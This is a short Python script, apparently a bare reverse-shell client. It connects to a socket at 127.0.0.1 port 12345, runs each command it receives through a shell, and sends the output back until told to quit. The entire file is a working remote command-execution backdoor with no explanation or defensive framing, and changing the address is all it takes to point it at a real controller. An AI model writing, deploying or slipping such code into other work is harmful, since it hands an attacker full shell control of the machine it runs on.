#!/usr/bin/python3
import socket
import subprocess


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 12345))
print("Connection stablished to server!")

while True:
    command = sock.recv(1024).decode()

    if command == "q":
        break
    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        sock.send(result)
sock.close()
